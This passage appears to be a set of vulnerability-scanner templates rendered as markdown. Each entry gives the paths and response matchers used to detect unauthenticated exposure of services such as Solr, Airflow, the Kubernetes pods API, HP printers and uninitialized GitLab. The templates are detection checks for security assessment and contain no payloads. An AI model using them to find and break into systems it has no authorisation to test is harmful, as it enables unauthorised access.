- {{BaseURL}}/applications.pinpoint

### Matchers

**Type - word**

- words
  1. applicationName
  2. serviceType
- condition - and
- part - body

**Type - word**

- words
  1. application/json
- part - header

**Type - status**

- status
  1. 200

---

# Alert Manager - Unauthenticated Access

## Description

- Alert Manager was able to be accessed with no authentication requirements in place.
- severity - high
- tags - unauth,alertmanager

## Requests

- Method - GET

### URL

- {{BaseURL}}/#/alerts

### Matchers

**Type - word**

- words
  1. \<title>Alertmanager\</title>

**Type - status**

- status
  1. 200

---

# KubeCost - Unauthenticated Dashboard Exposure

- severity - medium
- tags - misconfig,exposure,unauth,kubecost

## Requests

- Method - GET

### URL

- {{BaseURL}}/overview.html

### Matchers

**Type - word**

- words
  1. \<title>Cluster Overview | Kubecost\</title>

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# Solr - Admin Page Access

## Description

- Solr's admin page was able to be accessed with no authentication requirements in place.
- severity - high
- tags - solr,unauth,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/admin/
- {{BaseURL}}/solr/admin/

### Matchers

**Type - word**

- words
  1. \<title>Solr admin page\</title>

**Type - status**

- status
  1. 200

---

# Tensorflow Tensorboard - Unauthenticated Access

## Description

- Tensorflow Tensorboard was able to be accessed with no authentication requirements in place.
- severity - high
- tags - tensorflow,tensorboard,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/data/plugins_listing

### Matchers

**Type - word**

- words
  1. scalars
  2. loading_mechanism
  3. custom_scalars
- condition - and

**Type - status**

- status
  1. 200

---

# Android Debug Manager

- severity - low
- tags - unauth,android

## Requests

- Method - GET

### URL

- {{BaseURL}}

### Matchers

**Type - word**

- words
  1. \<title>Android Debug Database\</title>

**Type - status**

- status
  1. 200

---

# Kubernetes Pods - API Discovery & Remote Code Execution

## Description

- A Kubernetes Pods API was discovered. When the service port is available, unauthenticated users can execute commands inside the container.
- severity - critical
- tags - k8,unauth,kubernetes,devops

## Requests

- Method - GET

### URL

- {{BaseURL}}/pods
- {{BaseURL}}/api/v1/pods

### Matchers

**Type - word**

- words
  1. apiVersion

**Type - word**

- words
  1. application/json
- part - header

**Type - status**

- status
  1. 200

---

# Unauthenticated Airflow Instance

- severity - high
- tags - apache,airflow,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}
- {{BaseURL}}/admin/

### Matchers

**Type - word**

- part - body
- words
  1. \<title>Airflow - DAGs\</title>

**Type - status**

- status
  1. 200

---

# Apache Hbase Unauth

- severity - medium
- tags - apache,unauth,misconfig

## Requests

- Method - GET

### URL

- {{BaseURL}}/conf

### Matchers

**Type - word**

- words
  1. \<name>hbase.defaults.for.version\</name>
  2. \<source>hbase-default.xml\</source>

**Type - status**

- status
  1. 200

---

# Apache Storm Unauth

- severity - medium
- tags - apache,unauth,misconfig

## Requests

- Method - GET

### URL

- {{BaseURL}}/api/v1/cluster/summary

### Matchers

**Type - word**

- part - body
- words
  1. "totalMem":
  2. "stormVersion":
- condition - and

**Type - status**

- status
  1. 200

---

# GoCd Unauth Dashboard

- severity - medium
- tags - go,gocd,unauth,misconfig

## Requests

- Method - GET

### URL

- {{BaseURL}}/go/admin/pipelines/create?group=defaultGroup

### Matchers

**Type - word**

- words
  1. \<title>Create a pipeline - Go\</title>

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# Unauthorized HP Printer

- severity - high
- tags - hp,iot,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/SSI/Auth/ip_snmp.htm

### Matchers

**Type - word**

- words
  1. HP
  2. \<h1>SNMP\</h1>
- condition - and

**Type - status**

- status
  1. 200

---

# Unauthorized HP office pro printer

- severity - high
- tags - hp,iot,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}
- {{BaseURL}}/hp/device/webAccess/index.htm?content=security

### Matchers

**Type - regex**

- regex
  1. \<title>(HP Officejet Pro([ 0-9A-Za-z]+)|HP Designjet([ 0-9A-Za-z]+).\*)\<\/title>

**Type - status**

- status
  1. 200

---

# Uninitialized GitLab instances

## Description

- Prior to version 14, GitLab installations required a root password to be
  set via the web UI. If the administrator skipped this step, any visitor
  could set a password and control the instance.

- severity - high
- tags - gitlab,misconfig,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/users/sign_in

### Matchers

**Type - word**

- part - body
- words
  1. Change your password
  2. New password
  3. Confirm new password
- condition - and

**Type - word**

- part - header
- words
  1. gitlab_session

**Type - status**

- status
  1. 200

---
